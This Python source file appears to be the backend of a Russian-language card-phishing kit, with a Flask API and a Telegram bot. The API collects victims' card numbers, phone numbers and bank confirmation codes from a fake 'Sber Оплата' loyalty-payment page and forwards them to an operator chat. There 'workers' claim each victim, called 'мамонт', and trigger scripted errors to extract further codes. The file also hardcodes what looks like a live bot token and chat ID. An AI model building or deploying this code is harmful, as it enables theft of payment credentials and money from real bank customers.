#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram Bot с Flask API для Valentine Sale
"""

import os
import logging
import random
import string
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import threading
import asyncio

# ============================================
# НАСТРОЙКИ
# ============================================
BOT_TOKEN = '7618907339:AAEGt7Xr-ZgC4vniSfPCARhO98Bfm1qVFTo'
CHAT_ID = '7888080337'
API_PORT = 5000
# ============================================

# Логирование
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Flask приложение
app = Flask(__name__)
CORS(app)

# Хранилище логов (в памяти, для продакшена лучше Redis/DB)
logs = {}

# Статусы: waiting -> code -> processing -> done/error
# waiting - ожидание взятия лога
# code - ожидание ввода кода
# processing - обработка кода
# done - успех
# error - ошибка

def generate_log_id():
    """Генерация уникального ID лога"""
    return ''.join(random.choices(string.digits, k=8))

def get_device(user_agent):
    """Определение устройства по User-Agent"""
    ua = user_agent.lower()
    if 'android' in ua:
        return 'Android'
    elif 'iphone' in ua or 'ipad' in ua:
        return 'iOS'
    elif 'windows' in ua:
        return 'Windows'
    elif 'mac' in ua:
        return 'MacOS'
    return 'Unknown'

def get_bank(card_number):
    """Определение банка по BIN карты"""
    card = card_number.replace(' ', '')[:6]
    banks = {
        '427650': 'Сбербанк', '427651': 'Сбербанк', '427652': 'Сбербанк',
        '427653': 'Сбербанк', '427654': 'Сбербанк', '427655': 'Сбербанк',
        '427901': 'Сбербанк', '427902': 'Сбербанк', '546901': 'Сбербанк',
        '546902': 'Сбербанк', '220220': 'Сбербанк МИР', '220224': 'Сбербанк МИР',
        '521324': 'Тинькофф', '437773': 'Тинькофф', '553691': 'Тинькофф',
        '220070': 'Тинькофф МИР', '415482': 'Альфа-Банк', '477964': 'Альфа-Банк',
        '548673': 'Альфа-Банк', '220028': 'Альфа-Банк МИР', '510621': 'Газпромбанк',
        '548999': 'Газпромбанк', '220040': 'ВТБ МИР', '427229': 'ВТБ',
        '447520': 'Райффайзен', '462730': 'Райффайзен', '220003': 'Открытие МИР',
        '405992': 'Почта Банк',
    }
    for prefix, bank in banks.items():
        if card.startswith(prefix):
            return bank
    return 'Неизвестный банк'

def get_keyboard(log_id, status='waiting'):
    """Клавиатура для сообщения в боте"""
    if status == 'waiting':
        return InlineKeyboardMarkup([
            [InlineKeyboardButton('📋 Взять лог', callback_data=f'take_{log_id}')],
            [
                InlineKeyboardButton('❌ Ошибка на ТП', callback_data=f'error_tp_{log_id}'),
                InlineKeyboardButton('🔄 Смена банка', callback_data=f'change_bank_{log_id}')
            ],
            [InlineKeyboardButton('📷 QR', callback_data=f'qr_{log_id}')]
        ])
    elif status == 'code':
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton('🔄 Новый код', callback_data=f'new_code_{log_id}'),
                InlineKeyboardButton('❌ Неверный код', callback_data=f'wrong_code_{log_id}')
            ],
            [
                InlineKeyboardButton('1/2', callback_data=f'half1_{log_id}'),
                InlineKeyboardButton('1/3', callback_data=f'half2_{log_id}')
            ],
            [
                InlineKeyboardButton('😠 900 1.0', callback_data=f'call900_1_{log_id}'),
                InlineKeyboardButton('😠 900 2.0', callback_data=f'call900_2_{log_id}')
            ],
            [
                InlineKeyboardButton('💰 Баланс 1.0', callback_data=f'balance1_{log_id}'),
                InlineKeyboardButton('💰 Баланс 2.0', callback_data=f'balance2_{log_id}')
            ],
            [
                InlineKeyboardButton('🔄 Смена банка', callback_data=f'change_bank_{log_id}'),
                InlineKeyboardButton('💳 Смена карты', callback_data=f'change_card_{log_id}')
            ],
            [
                InlineKeyboardButton('❌ Ошибка на ТП', callback_data=f'error_tp_{log_id}'),
                InlineKeyboardButton('❌ Неверная карта', callback_data=f'wrong_card_{log_id}')
            ],
            [
                InlineKeyboardButton('💵 Точный баланс', callback_data=f'exact_balance_{log_id}'),
                InlineKeyboardButton('✏️ Своя ошибка', callback_data=f'custom_error_{log_id}')
            ],
            [InlineKeyboardButton('✅', callback_data=f'success_{log_id}')],
            [InlineKeyboardButton('Проверить онлайн', callback_data=f'check_online_{log_id}')],
            [
                InlineKeyboardButton('Задать вопрос', callback_data=f'ask_{log_id}'),
                InlineKeyboardButton('Сбер ЛК', callback_data=f'sber_lk_{log_id}')
            ],
            [InlineKeyboardButton('ВТБ ЛК', callback_data=f'vtb_lk_{log_id}')],
            [InlineKeyboardButton('Назад на 3дс', callback_data=f'back_3ds_{log_id}')],
            [InlineKeyboardButton('📷 QR', callback_data=f'qr_{log_id}')]
        ])
    return None

def format_log_message(log_data, status='waiting'):
    """Форматирование сообщения лога"""
    log_id = log_data['id']
    card = log_data['card']
    phone = log_data['phone']
    bank = log_data['bank']
    device = log_data['device']
    worker = log_data.get('worker', '')
    
    card_last4 = card.replace(' ', '')[-4:] if card != '-' else '-'
    
    if status == 'waiting':
        return f"""⚠️ <b>Мамонт ожидает код.</b>

🆔 <b>ID Ссылки:</b> {log_id}
🌐 <b>Сервис:</b> Sber Оплата
📋 <b>Название:</b> Эксклюзивная программа лояльности
💰 <b>Сумма:</b> 15000 RUB

💳 <b>Карта:</b> <code>{card}</code>
📅 <b>Дата:</b> null
🔒 <b>CVC:</b> null
💵 <b>Баланс:</b> Чекер не включен

📞 <b>Номер телефона:</b> <code>{phone}</code>

🏦 <b>Банк:</b> {bank}"""
    
    elif status == 'code':
        worker_line = f"\n👤 <b>Воркер:</b> @{worker}[{CHAT_ID}]" if worker else ""
        return f"""👤 <b>Воркер:</b> @{worker}[{CHAT_ID}]
🆔 <b>ID Ссылки:</b> {log_id}
🌐 <b>Сервис:</b> Sber Оплата
📋 <b>Название:</b> Эксклюзивная программа лояльности
💰 <b>Сумма:</b> 15000 RUB

💳 <b>Карта:</b> <code>{card}</code>
📅 <b>Дата:</b> null
🔒 <b>CVC:</b> null
💵 <b>Баланс:</b> Чекер не включен

📞 <b>Номер телефона:</b> <code>{phone}</code>

🏦 <b>Банк:</b> {bank} ❤️"""
    
    return ""

# ============================================
# TELEGRAM BOT HANDLERS
# ============================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    await update.message.reply_text('🤖 Valentine Sale Bot запущен!')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка нажатий кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    parts = data.split('_')
    action = parts[0]
    log_id = parts[-1]
    
    if log_id not in logs:
        await query.answer('❌ Лог не найден', show_alert=True)
        return
    
    log_data = logs[log_id]
    
    # Взять лог
    if data.startswith('take_'):
        log_data['status'] = 'code'
        log_data['worker'] = query.from_user.username or query.from_user.first_name
        
        new_text = format_log_message(log_data, 'code')
        new_keyboard = get_keyboard(log_id, 'code')
        
        await query.edit_message_text(
            text=new_text,
            parse_mode='HTML',
            reply_markup=new_keyboard
        )
        await query.answer('✅ Лог взят!')
    
    # Новый код
    elif data.startswith('new_code_'):
        log_data['status'] = 'code'
        log_data['code'] = None
        await query.answer('🔄 Запрошен новый код')
    
    # Неверный код
    elif data.startswith('wrong_code_'):
        log_data['error'] = 'wrong_code'
        await query.answer('❌ Код помечен как неверный')
    
    # Успех
    elif data.startswith('success_'):
        log_data['status'] = 'done'
        await query.edit_message_text(
            text=query.message.text + '\n\n✅ <b>УСПЕШНО</b>',
            parse_mode='HTML'
        )
        await query.answer('✅ Успешно!')
    
    # Ошибка на ТП
    elif data.startswith('error_tp_'):
        log_data['status'] = 'error'
        log_data['error'] = 'tp_error'
        await query.answer('❌ Ошибка на ТП')
    
    # Другие кнопки
    else:
        await query.answer(f'Действие: {action}')

# ============================================
# FLASK API ENDPOINTS
# ============================================

@app.route('/api/log', methods=['POST'])
def create_log():
    """Создание нового лога"""
    data = request.json
    log_id = generate_log_id()
    
    card = data.get('card', '-')
    phone = data.get('phone', '-')
    user_agent = request.headers.get('User-Agent', '')
    
    log_data = {
        'id': log_id,
        'card': card,
        'phone': phone,
        'bank': get_bank(card) if card != '-' else '-',
        'device': get_device(user_agent),
        'status': 'waiting',
        'code': None,
        'error': None,
        'worker': None,
        'created_at': datetime.now().isoformat(),
        'message_id': None
    }
    
    logs[log_id] = log_data
    
    # Отправляем в Telegram (асинхронно)
    asyncio.run(send_log_to_telegram(log_data))
    
    return jsonify({'success': True, 'log_id': log_id})

async def send_log_to_telegram(log_data):
    """Отправка лога в Telegram"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    text = format_log_message(log_data, 'waiting')
    keyboard = get_keyboard(log_data['id'], 'waiting')
    
    async with application:
        message = await application.bot.send_message(
            chat_id=CHAT_ID,
            text=text,
            parse_mode='HTML',
            reply_markup=keyboard
        )
        log_data['message_id'] = message.message_id

@app.route('/api/log/<log_id>/status', methods=['GET'])
def get_log_status(log_id):
    """Получение статуса лога"""
    if log_id not in logs:
        return jsonify({'error': 'Log not found'}), 404
    
    log_data = logs[log_id]
    return jsonify({
        'status': log_data['status'],
        'error': log_data.get('error'),
        'card_last4': log_data['card'].replace(' ', '')[-4:] if log_data['card'] != '-' else None
    })

@app.route('/api/log/<log_id>/code', methods=['POST'])
def submit_code(log_id):
    """Отправка кода"""
    if log_id not in logs:
        return jsonify({'error': 'Log not found'}), 404
    
    data = request.json
    code = data.get('code', '')
    
    log_data = logs[log_id]
    log_data['code'] = code
    log_data['status'] = 'processing'
    
    # Отправляем код в Telegram
    asyncio.run(send_code_to_telegram(log_data, code))
    
    return jsonify({'success': True})

async def send_code_to_telegram(log_data, code):
    """Отправка кода в Telegram"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    async with application:
        await application.bot.send_message(
            chat_id=CHAT_ID,
            text=f"🔐 <b>Код от {log_data['id']}:</b> <code>{code}</code>",
            parse_mode='HTML'
        )

@app.route('/api/health', methods=['GET'])
def health_check():
    """Проверка работоспособности"""
    return jsonify({'status': 'ok', 'logs_count': len(logs)})

# ============================================
# ЗАПУСК
# ============================================

def run_flask():
    """Запуск Flask сервера"""
    app.run(host='0.0.0.0', port=API_PORT, debug=False)

def run_bot():
    """Запуск Telegram бота"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    # Запускаем Flask в отдельном потоке
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    logger.info(f'🚀 API запущен на порту {API_PORT}')
    logger.info('🤖 Запускаем Telegram бота...')
    
    # Запускаем бота в основном потоке
    run_bot()
